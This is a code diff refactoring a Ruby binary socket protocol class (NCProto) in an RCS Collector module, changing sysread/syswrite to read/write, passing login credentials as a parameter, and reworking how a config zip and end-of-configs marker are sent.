@@ -2,13 +2,8 @@
 #  The NC protocol implementation
 #
 
-# relatives
-require_relative 'db.rb'
-
 # from RCS::Common
 require 'rcs-common/trace'
-
-# system
 
 module RCS
 module Collector
@@ -41,7 +36,7 @@ class NCProto
   def get_command
     begin
       # get the command
-      command = @socket.sysread(HEADER_LENGTH)
+      command = @socket.read(HEADER_LENGTH)
       # decode the integer
       return command.unpack('i').first
     rescue EOFError
@@ -49,9 +44,9 @@ class NCProto
     end
   end
 
-  def login
+  def login(auth)
     # login command payload
-    command = DB.instance.network_signature
+    command = auth
 
     # the common header
     header = [PROTO_LOGIN].pack('i')
@@ -61,8 +56,8 @@ class NCProto
     message = header + command
 
     # send and receive
-    @socket.syswrite message
-    response = @socket.sysread(HEADER_LENGTH)
+    @socket.write message
+    response = @socket.read(HEADER_LENGTH)
 
     # check if everything is ok
     return true if response.unpack('i') == [PROTO_OK]
@@ -72,66 +67,64 @@ class NCProto
 
   def version
     # the version is an array of 16 bytes
-    response = @socket.sysread(16).delete("\x00")
+    response = @socket.read(16).delete("\x00")
 
     # send the OK
     header = [PROTO_OK].pack('i')
     header += [0].pack('i')
-    @socket.syswrite header
+    @socket.write header
 
     return response
   end
 
   def monitor
     # the status (OK, KO, WARN)
-    status = @socket.sysread(16).delete("\x00")
+    status = @socket.read(16).delete("\x00")
 
     # 3 consecutive int
-    disk, cpu, pcpu = @socket.sysread(12).unpack('iii')
+    disk, cpu, pcpu = @socket.read(12).unpack('iii')
 
     # the status description
-    desc = @socket.sysread(1024).delete("\x00")
+    desc = @socket.read(1024).delete("\x00")
 
     # send the OK
     header = [PROTO_OK].pack('i')
     header += [0].pack('i')
-    @socket.syswrite header
+    @socket.write header
 
     return [status, desc, disk, cpu, pcpu]
   end
 
   def config(content)
-    # the element does not need a new config
-    if content.nil? then
-      # send the NO
-      header = [PROTO_NO].pack('i')
-      header += [0].pack('i')
-      @socket.syswrite header
-      return
+    # the element have a new config
+    unless content.nil? then
+      # retro compatibility (260 byte array for the name)
+      message = "config.zip".ljust(260, "\x00")
+      # len of the file
+      message += [content.length].pack('i')
+  
+      # send the CONF command
+      header = [PROTO_CONF].pack('i')
+      header += [message.length].pack('i')
+      @socket.write header + message + content
     end
 
-    # retro compatibility (260 byte array for the name)
-    message = "config.zip".ljust(260, "\x00")
-    # len of the file
-    message += [content.length].pack('i')
-    # the file
-    message += content
-    
-    # send the CONF command
-    header = [PROTO_CONF].pack('i')
-    header += [message.length].pack('i')
-    @socket.syswrite header + message
-
+    # the protocol support sending of multiple files in a loop
+    # since we have only one file, notify the peer that there
+    # are no more configs to be sent
+    header = [PROTO_NO].pack('i')
+    header += [0].pack('i')
+    @socket.write header
   end
 
   def log
     # convert from C "struct tm" to ruby objects
     # tm_sec, tm_min, tm_hour, tm_mday, tm_mon, tm_year, tm_wday, tm_yday, tm_isdst
-    struct_tm = @socket.sysread(4 * 9).unpack('i*')
+    struct_tm = @socket.read(4 * 9).unpack('i*')
     time = Time.gm(*struct_tm, 0)
 
     # type of the log
-    type = @socket.sysread(4).unpack('i').first
+    type = @socket.read(4).unpack('i').first
     case type
       when LOG_INFO
         type = 'INFO'
@@ -141,7 +134,7 @@ class NCProto
         type = 'DEBUG'
     end
     # the message
-    desc = @socket.sysread(1024).delete("\x00")
+    desc = @socket.read(1024).delete("\x00")
 
     return [time, type, desc]
   end
